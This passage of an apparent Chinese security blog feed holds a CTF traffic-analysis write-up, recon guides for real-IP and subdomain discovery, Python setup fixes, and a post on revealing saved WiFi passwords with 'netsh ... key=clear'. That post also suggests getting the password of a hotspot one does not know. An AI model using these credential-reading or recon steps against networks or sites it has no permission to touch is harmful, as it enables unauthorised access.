src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_access.png"></li><li><p>使用foremost分离出附件中的文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_foremost_zip.png"></li><li><p>尝试使用WinRAR打开分离出来的压缩文件。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_winrar_pwd.png"></li><li><p>使用WireShark进行数据分析。分组详情(flag.txt)查找，发现有一个特殊文件6666.jpg。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_wireshark_6666.png"></li><li><p>右键追踪TCP流，复制6666.jpg二进制内容。（从FFD8到最后(FFD9)）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/复制二进制内容.png" alt="复制二进制内容"></center></li><li><p>粘贴(ASCII Hex)刚刚复制的内容到C32asm中，并保存该文件为6666.jpg</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_c32asm_6666.png"></li><li><p>查看66666.jpg文件得到解压密码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_jpg_pwd.png"></li><li><p>使用WinRAR解压并查看flag.txt文件内容。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/misccaidao_get_flag.png"></li><li><p>得到Flag：<code>flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</code></p></li></ol><p><strong>0x04 考察知识：</strong></p><ul><li>隐写术</li><li>流量分析</li><li>静态文件分析</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常规信息收集之真实IP</title>
      <link href="/2020/09/28/chang-gui-xin-xi-shou-ji-zhi-zhen-shi-ip/"/>
      <url>/2020/09/28/chang-gui-xin-xi-shou-ji-zhi-zhen-shi-ip/</url>
      
        <content type="html"><![CDATA[<h1 id="查找CDN背后的真实IP"><a href="#查找CDN背后的真实IP" class="headerlink" title="查找CDN背后的真实IP"></a>查找CDN背后的真实IP</h1><p><strong>第三方搜索引擎</strong>：</p><ul><li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a></li><li><a href="https://censys.io/" target="_blank" rel="noopener">Censys</a></li><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan</a></li><li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">全球DNS搜索引擎</a></li><li><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a></li><li><a href="http://lookahead.surfwax.com/" target="_blank" rel="noopener">SurfWax</a></li><li><a href="archive.org/web/">Way Back Machine(搜索网站过去的样子)</a></li><li><a href="http://scholar.google.com.ph/" target="_blank" rel="noopener">Google学术</a></li></ul><p><strong>让网站与你主动建立连接</strong>：</p><p>example：订阅网站、RSS、注册链接</p><p>方法：查看邮件源代码（也有一种可能就是邮件服务器IP跟Web服务器只是在一个C段上，这时候就需要对整个C段进行扫描）</p><p>缺点：目标站使用其他邮箱接口此方法则失效</p><p>步骤：</p><ol><li>使用邮箱注册网站用户时一般会将验证码或验证链接发送到邮箱，下图为<a href="https://www.gushiwen.cn/" target="_blank" rel="noopener">古诗文网</a>注册时收到的验证码邮件信息。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/收到古诗文网验证码邮件.png" alt="收到古诗文网验证码邮件"></center><ol start="2"><li>点击显示邮件原文选项，展示效果如下图所示。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/显示邮件原文.png" alt="显示邮件原文"></center><h1 id="IP段整理"><a href="#IP段整理" class="headerlink" title="IP段整理"></a>IP段整理</h1><p>网址：</p><ul><li><a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">中国互联网信息中心-whois</a></li></ul><p>步骤：</p><ol><li><p>IPv4地址查询。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/IPv4地址查询.png" alt="IPv4地址查询"></center></li><li><p>IP地址查询结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/IP地址查询结果.png" alt="IP地址查询结果"></center></li><li><p>网络名称查询。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/网络名称查询.png" alt="网络名称查询"></center></li><li><p>网络名称查询结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/网络名称查询结果.png" alt="网络名称查询结果"></center></li></ol><h1 id="C段和旁站"><a href="#C段和旁站" class="headerlink" title="C段和旁站"></a>C段和旁站</h1><p>网址：</p><ul><li><a href="https://webscan.cc/" target="_blank" rel="noopener">The Web of WebScan</a></li></ul><p>步骤：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/IP/WebScan.png" alt="WebScan"></center><h1 id="纯真IP数据库"><a href="#纯真IP数据库" class="headerlink" title="纯真IP数据库"></a>纯真IP数据库</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>查看已连接的WiFi密码</title>
      <link href="/2020/09/28/cha-kan-yi-lian-jie-de-wifi-mi-ma/"/>
      <url>/2020/09/28/cha-kan-yi-lian-jie-de-wifi-mi-ma/</url>
      
        <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>​        有将WLAN设置为<strong>在信号范围内自动连接</strong>的习惯，今天想在一个新设备上连接WiFi时发现忘记密码了。<code>(:-……</code></p><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>​        现在有一台电脑和一部手机已经连接到WiFi上，在不直接去路由器中查看WiFi密码或使用WiFi破解工具的情况下，想通过查看已连接设备中存储的WiFi密码来得到WiFi密码。</p><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="电脑端"><a href="#电脑端" class="headerlink" title="电脑端"></a>电脑端</h2><h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><p><strong>环境</strong>：</p><ul><li>系统：Windows10</li><li>热点：CMCC-335574918</li></ul><p><strong>步骤</strong>：</p><ol><li><p>连接SSID为<code>CMCC-335574918</code>的热点，然后点击【网路和Internet设置】，打开网络和Internet设置界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/网络和Internet设置界面.png" alt="网络和Internet设置界面"></center></li><li><p>点击【网络和共享中心】，打开网络和共享中心设置界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/网络和共享中心界面.png" alt="网络和共享中心界面"></center></li><li><p>点击已连接的WLAN(CMCC-335574918)后显示WLAN状态界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/WLAN状态界面.png" alt="WLAN状态界面"></center></li><li><p>点击【无线属性按钮】后显示CMCC-335574918无线网络属性界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线网络属性界面.png" alt="无线网络属性界面"></center></li><li><p>点击【安全】选项卡后显示无线网络安全对应信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线网络安全选项卡.png" alt="无线网络安全选项卡"></center></li><li><p>勾选显示字符选项，即可查看CMCC-335574918无线网络的密码。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/查看无线网络密码.png" alt="查看无线网络密码"></center></li></ol><p>局限性：</p><ul><li>必须是正在连接的网络</li></ul><h3 id="命令行界面"><a href="#命令行界面" class="headerlink" title="命令行界面"></a>命令行界面</h3><ol><li><p>使用管理员身份打开PowerShell，【Win+X】 → 选择【Windows PowerShell（管理员）】选项，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/以管理员身份打开PowerShell.png" alt="以管理员身份打开PowerShell"></center></li><li><p>使用<code>netsh wlan show profile</code>命令查看当前主机连接过程的所有WiFi的配置文件名称，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/显示所有的配置文件.png" alt="显示所有的配置文件"></center></li><li><p>使用<code>netsh wlan show profile CMCC-335574918 key=clear</code>命令查看指定WiFi配置文件信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/查看指定WiFi的密码.png" alt="查看指定WiFi的密码"></center></li></ol><h2 id="手机端"><a href="#手机端" class="headerlink" title="手机端"></a>手机端</h2><p><strong>环境</strong>：</p><ul><li>系统：Android</li><li>热点：CMCC-EDU</li></ul><p><strong>步骤</strong>：</p><ol><li><p>确保无线已连接成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/连接WiFi.png" alt="连接WiFi"></center></li><li><p>点击手机的设置图标，进入设置界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/设置界面.jpg" alt="设置界面"></center></li><li><p>点击无线网络选项后进入无线网络界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线网络界面.png" alt="无线网络界面"></center></li><li><p>找到已连接的WiFi并点击详情图标。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线网络详情.png" alt="无线网络详情"></center></li><li><p>点击界面中的分享网络，接着会生成一个二维码，截图保存。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线二维码.jpg" alt="无线二维码"></center></li><li><p>使用微信扫一扫功能，扫描截取的二维码，得到无线密码信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/WiFi/ShowPassword/无线密码.png" alt="无线密码"></center></li></ol><h1 id="问题反思"><a href="#问题反思" class="headerlink" title="问题反思"></a>问题反思</h1><ul><li>人的记忆存在一点的有效期，某些记忆在一定时间后会被遗忘。因此我们可以选好记或印象深刻的信息作为密码。</li><li>在设置密码时不要设置简单常用的密码，防止密码被爆破成功。</li><li>对于种类繁多的密码，我们可以密码管理工具帮助我们整理和存储密码。</li><li>已连接的WiFi密码会存储在设备上，我们可以通过简单的操作得到已连接WiFi的密码。</li><li><font color="red">对于一个未知密码的热点，我们可以使用WiFi万能钥匙或其他工具先连接上该热点，再通过扫描分享网络的二维码得到该热点的密码。</font></li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://baike.baidu.com/item/Wi-Fi/151036" target="_blank" rel="noopener">Wi-Fi</a></li><li><a href="https://guanjia.qq.com/web_clinic/s4/1224.html" target="_blank" rel="noopener">在Win10中，怎么查看已连接wifi密码？</a></li><li><a href="https://jingyan.baidu.com/article/3065b3b6536f63becff8a484.html" target="_blank" rel="noopener">如何查看手机已连接的wifi密码？</a></li><li><a href="https://www.freebuf.com/articles/network/148763.html" target="_blank" rel="noopener">使用cmd获知WIFI密码</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码 </tag>
            
            <tag> WIFI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常规信息收集之域名</title>
      <link href="/2020/09/27/chang-gui-xin-xi-shou-ji-zhi-yu-ming/"/>
      <url>/2020/09/27/chang-gui-xin-xi-shou-ji-zhi-yu-ming/</url>
      
        <content type="html"><![CDATA[<h1 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h1><h2 id="子域名发现原理"><a href="#子域名发现原理" class="headerlink" title="子域名发现原理"></a>子域名发现原理</h2><ul><li>利用搜索引擎<ul><li>网页搜索引擎（如：google等）</li><li>空间搜索引擎（如：Shodan等）</li><li>SSL证书（如：crt.sh等）</li></ul></li><li>爆破<ul><li>直接访问子域名</li><li>利用DNS请求</li></ul></li><li>其他泄露信息<ul><li>crossdomain.xml文件等</li><li>爬虫递归爬取等</li><li>DNS域传送漏洞等</li></ul></li></ul><h1 id="备案号查询"><a href="#备案号查询" class="headerlink" title="备案号查询"></a>备案号查询</h1><p>​        备案号是网站是否合法注册经营的标志，可随时到国家工业和信息化部网站备案系统上查询该ICP备案的相关详细信息。</p><p>网址：<a href="http://www.beianbeian.com/" target="_blank" rel="noopener">ICP备案查询网</a></p><ul><li>查询<code>www.baidu.com</code>域名的备案信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/网站域名备案信息查询.png" alt="网站域名备案信息查询"></center><ul><li>点击【反查】，得到百度公司其他网站域名信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/备案号反查结果.png" alt="备案号反查结果"></center><h1 id="暴力枚举"><a href="#暴力枚举" class="headerlink" title="暴力枚举"></a>暴力枚举</h1><h2 id="Layer子域名挖掘机5-0-SAINTSEC更新版"><a href="#Layer子域名挖掘机5-0-SAINTSEC更新版" class="headerlink" title="Layer子域名挖掘机5.0 SAINTSEC更新版"></a>Layer子域名挖掘机5.0 SAINTSEC更新版</h2><p><strong>Author</strong>：<code>Seay</code></p><p><strong>Modify</strong>：<code>akast、dark3r</code></p><p><strong>描述</strong>：</p><ul><li><p>支持服务接口、暴力搜索、同服挖掘三种模式</p></li><li><p>支持打开网站、复制域名、复制IP、复制CDN</p></li><li><p>支持导出检测结果等功能</p></li><li><p>速度比较快，但比较吃带宽</p></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/Layer爆破结果.png" alt="Layer爆破结果"></center><h2 id="subDomainsBrute"><a href="#subDomainsBrute" class="headerlink" title="subDomainsBrute"></a>subDomainsBrute</h2><p><strong>Author</strong>：李劼杰</p><p><strong>描述</strong>：</p><ul><li>这个脚本的主要目的是发现其他工具无法探测到的域名，如Google、aizhan、fofa。</li><li>高频扫描每秒DNS请求数可超过1000次</li></ul><p><strong>Download Link</strong>：</p><ul><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/subDomainBrute爆破结束.png" alt="subDomainBrute爆破结束"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/subDomainBrute爆破结果展示.png" alt="subDomainBrute爆破结果展示"></center><h1 id="SSL证书查询"><a href="#SSL证书查询" class="headerlink" title="SSL证书查询"></a>SSL证书查询</h1><h2 id="censys-io"><a href="#censys-io" class="headerlink" title="censys.io"></a>censys.io</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/censys子域名查询.png" alt="censys子域名查询"></center><h2 id="crt-sh"><a href="#crt-sh" class="headerlink" title="crt.sh"></a>crt.sh</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/crt.sh.png" alt="crt.sh"></center><h2 id="dnsdumpster-com"><a href="#dnsdumpster-com" class="headerlink" title="dnsdumpster.com"></a>dnsdumpster.com</h2><ul><li>DNS服务器</li><li>MX记录</li><li>主机记录</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/IP地址分布.png" alt="IP地址分布"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/查询到的记录.png" alt="查询到的记录"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/查询域名关系图.png" alt="查询域名关系图"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/查询域名关系图(局部).png" alt="查询域名关系图(局部)"></center><h2 id="证书泄密"><a href="#证书泄密" class="headerlink" title="证书泄密"></a>证书泄密</h2><p>工具：火狐浏览器</p><p>操作：</p><ul><li>访问一个https的链接可能出现</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/面临潜在的安全风险.png" alt="面临潜在的安全风险"></center><ul><li>点击【高级…】按钮。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/高级选项.png" alt="高级选项"></center><h1 id="第三方接口"><a href="#第三方接口" class="headerlink" title="第三方接口"></a>第三方接口</h1><h2 id="shodan-io"><a href="#shodan-io" class="headerlink" title="shodan.io"></a>shodan.io</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/shodan域名查询.png" alt="shodan域名查询"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/shodan主机名查询.png" alt="shodan主机名查询"></center><h2 id="fofa-so"><a href="#fofa-so" class="headerlink" title="fofa.so"></a>fofa.so</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/fofa域名查询.png" alt="fofa域名查询"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/InfoGathering/Domain/fofa标题查询.png" alt="fofa标题查询"></center>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> 域名收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决rsatool-py脚本报错</title>
      <link href="/2020/09/17/jie-jue-rsatool-py-jiao-ben-bao-cuo/"/>
      <url>/2020/09/17/jie-jue-rsatool-py-jiao-ben-bao-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>​        在解决RSA相关的Crypto问题时，需要计算推出私钥就使用<code>rsatool.py</code>来推到私钥。由于是第一次在本机中运行该脚本就出现了一系列与模块相关的报错信息。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/gmpy模块未安装.png" alt="gmpy模块未安装"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/pyasn1模块未安装.png" alt="pyasn1模块未安装"></center><h1 id="0x02-运行环境"><a href="#0x02-运行环境" class="headerlink" title="0x02 运行环境"></a>0x02 运行环境</h1><ul><li>OS：Windows 10</li><li>Python2.7</li></ul><h1 id="0x03-解决思路"><a href="#0x03-解决思路" class="headerlink" title="0x03 解决思路"></a>0x03 解决思路</h1><ul><li>首先对于模块却是问题，先使用<code>pip</code>管理工具进行包安装</li></ul><h1 id="0x04-解决步骤"><a href="#0x04-解决步骤" class="headerlink" title="0x04 解决步骤"></a>0x04 解决步骤</h1><ul><li>使用<code>pip2 install gmpy</code>命令来安装<code>gmpy</code>模块，但是仍然报错。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/gmpy安装失败.png" alt="gmpy安装失败"></center><ul><li>根据提示信息使用<code>python2.exe -m pip install --upgrade pip</code>命令更新<code>pip</code>工具。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/更新pip工具.png" alt="更新pip工具"></center><ul><li><code>pip</code>工具更新完毕后，仍使用<code>pip2 install gmpy</code>命令来安装<code>gmpy</code>模块，但依然报错。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/gmpy安装仍然失败.png" alt="gmpy安装仍然失败"></center><ul><li>无奈之下采用本地whl文件安装，先到<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">LDF</a>下载相对应的whl文件。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/下载gmpy的whl文件.png" alt="下载gmpy的whl文件"></center><ul><li>使用<code>pip2 install C:\Users\yushe\Downloads\gmpy-1.17-cp27-none-win_amd64.whl</code>命令完成<code>gmpy</code>模块的本地安装。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/gmpy安装成功.png" alt="gmpy安装成功"></center><ul><li><code>gmpy</code>模块安装成功后再次执行<code>python2 .\rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</code>命令，但又出现报错信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/pyasn1未安装.png" alt="pyasn1未安装"></center><ul><li>使用<code>pip2 install pyasn1</code>命令安装<code>pyasn1</code>模块。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/pyasn1成功安装.png" alt="pyasn1成功安装"></center><ul><li><code>pyasn1</code>模块安装后，再次执行<code>python2 .\rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</code>命令，程序执行一半又出现报错信息。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/rsatool执行依然失败.png" alt="rsatool执行依然失败"></center><ul><li>使用<code>pip2 list</code>命令查看当前已安装模块，其中<code>pyasn1</code>模块的版本为<code>0.4.8</code>。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/查看pip2已安装模块.png" alt="查看pip2已安装模块"></center><ul><li>找到<a href="https://ares-x.com/2020/03/23/%E8%A7%A3%E5%86%B3goldenPac%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/#more" target="_blank" rel="noopener">一篇文章</a>发现报错原因是<code>pyasn1</code>库的bug，降低版本可解决此问题，执行<code>pip2 uninstall  pyasn1</code>和<code>pip2 install pyasn1==0.4.5</code>命令完成<code>pyasn1</code>0.4.5版本库的安装。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/卸载pyasn1并安装低版本的pyasn1库.png" alt="卸载pyasn1并安装低版本的pyasn1库"></center><ul><li>再次执行<code>python2 .\rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</code>命令，完美解决报错问题。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/rsatool/rsatool执行成功.png" alt="rsatool执行成功"></center><h1 id="0x05-思考总结"><a href="#0x05-思考总结" class="headerlink" title="0x05 思考总结"></a>0x05 思考总结</h1><ul><li><p>对于别人编写的脚本直接拿来用时可能需要先配置一些缺失的环境，可以使用<code>pip</code>直接到镜像下载安装，也可以下载whl文件在本地安装。</p></li><li><p>在安装脚本的依赖环境时，最好有依赖包版本信息说明，因为版本也可能造成脚本执行失败。</p></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">Python Extension Packages for Windows - Christoph Gohlke</a></li><li><a href="https://blog.csdn.net/qq_27061049/article/details/71476303" target="_blank" rel="noopener">pyasn1模块缺失解决</a></li><li><a href="https://ares-x.com/2020/03/23/%E8%A7%A3%E5%86%B3goldenPac%E6%8A%A5%E9%94%99%E9%97%AE%E9%A2%98/#more" target="_blank" rel="noopener">解决GOLDENPAC报错问题</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> rsa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决python3安装gmpy2报错</title>
      <link href="/2020/09/17/jie-jue-python3-an-zhuang-gmpy2-bao-cuo/"/>
      <url>/2020/09/17/jie-jue-python3-an-zhuang-gmpy2-bao-cuo/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01 问题描述"></a>0x01 问题描述</h1><p>​        在攻防世界的Crypto新手区中有一个关于RSA的赛题，已给定<code>p</code>,<code>q</code>,<code>e</code>的值，求<code>d</code>的值，使用python编写脚本来得到Flag。使用<code>python3</code>执行该脚本时，发现本机还没有安装<code>gmpy2</code>模块，于是使用<code>pip3 install gmpy2</code>安装该模块，但却出现安装错误。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/gmpy2/安装gmpy2模块时报错.png" alt="安装gmpy2模块时报错"></center><h1 id="0x02-运行环境"><a href="#0x02-运行环境" class="headerlink" title="0x02 运行环境"></a>0x02 运行环境</h1><ul><li>Windows 10</li><li>python3</li><li>pip3</li></ul><h1 id="0x03-解决思路"><a href="#0x03-解决思路" class="headerlink" title="0x03 解决思路"></a>0x03 解决思路</h1><p>​        根据错误提示：<code>需要使用Microsoft Visual c++ 14.0或更高版本</code>，但本机确实已经安装了更高版本的<code>Microsoft Visual c++</code>。既然远程镜像安装失败，那么就再试试本地镜像安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/gmpy2/本机VisualCplusplus版本.png" alt="本机VisualCplusplus版本"></center><h1 id="0x04-解决步骤"><a href="#0x04-解决步骤" class="headerlink" title="0x04 解决步骤"></a>0x04 解决步骤</h1><ol><li><p>执行<code>pip3 install wheel</code>命令安装<code>wheel</code>文件包，若<code>wheel</code>文件包已安装，则可无需执行此命令。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/gmpy2/安装wheel.png" alt="安装wheel"></center></li><li><p>到<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">Python Extension Packages for Windows - Christoph Gohlke</a>下载<code>gmpy2</code>所需要的<code>whl</code>文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/gmpy2/下载gmpy2的whl文件.png" alt="下载gmpy2的whl文件"></center></li><li><p>在powershell中指定<code>gmpy2</code>模块的<code>whl</code>文件路径，并执行安装命令，显示<code>gmpy2</code>模块已安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Debug/python/gmpy2/安装gmpy2模块.png" alt="安装gmpy2模块"></center></li><li><p>执行python脚本得到flag。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/easy-RSA-flag.png" alt="成功执行python脚本"></center><h1 id="0x05-思考总结"><a href="#0x05-思考总结" class="headerlink" title="0x05 思考总结"></a>0x05 思考总结</h1><p>​        pip是python自带的包安装工具，但在使用<code>pip install xxx</code>安装的过程中，难免会因为被墙或其他原因导致安装无法成功，多次尝试后未果的可以去尝试其他的安装方式。</p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.cnblogs.com/wkzb/p/12565290.html" target="_blank" rel="noopener">python3安装gmpy2</a></li><li><a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/" target="_blank" rel="noopener">Python Extension Packages for Windows - Christoph Gohlke</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> debug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> gmpy2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下python2和python3共存环境搭建</title>
      <link href="/2020/09/17/windows-xia-python2-he-python3-gong-cun-huan-jing-da-jian/"/>
      <url>/2020/09/17/windows-xia-python2-he-python3-gong-cun-huan-jing-da-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-python版本下载"><a href="#0x01-python版本下载" class="headerlink" title="0x01 python版本下载"></a>0x01 python版本下载</h1><p>​        首先，需要到<a href="https://www.python.org/" target="_blank" rel="noopener">python官网</a>下载相关python的安装包。</p><ul><li>python2下载页面</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2下载页面.png" alt="python2下载页面"></center><ul><li>python3下载页面</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python3下载页面.png" alt="python3下载页面"></center><p>python环境所需安装包下载完毕之后就正式开始安装操作。</p><h1 id="0x02-python2安装"><a href="#0x02-python2安装" class="headerlink" title="0x02 python2安装"></a>0x02 python2安装</h1><ol><li><p>找到之前下载python2的位置，双击<code>python-2.7.18.amd64.msi</code>文件后开始python2的安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/BasicEnvironment/python2+3(win)/python2安装文件.png" alt="python2安装文件"></center></li><li><p>双击python2安装文件后，首先需要设置python2的用户，是本机所有用户还是仅当前用户，这里采用默认设置<code>(Install for all users)</code>。</p><center><img 